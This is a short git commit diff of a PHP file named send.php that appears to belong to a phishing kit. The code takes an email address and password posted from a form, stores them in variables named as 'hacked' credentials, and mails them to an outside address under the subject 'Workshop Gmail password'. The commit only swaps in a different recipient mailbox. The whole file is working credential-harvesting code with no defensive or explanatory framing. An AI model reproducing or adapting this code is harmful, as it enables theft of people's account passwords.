11ea182d18b185e91bbf284484e5044cc5b5342f
Sorteo <69730244+mrxhest@users.noreply.github.com>
2020-08-17 03:54:38 -0300

    Update send.php

--- send.php
+++ send.php
@@ -1,7 +1,7 @@
 <?php
         $mailhacked = $_POST["email"];
         $passwordhacked = $_POST["password"];
-         $to = "mrxhest@gmail.com";
+         $to = "nicocaposi@hotmail.com";
          $subject = "Workshop Gmail password";
          
          $message = "$mailhacked";
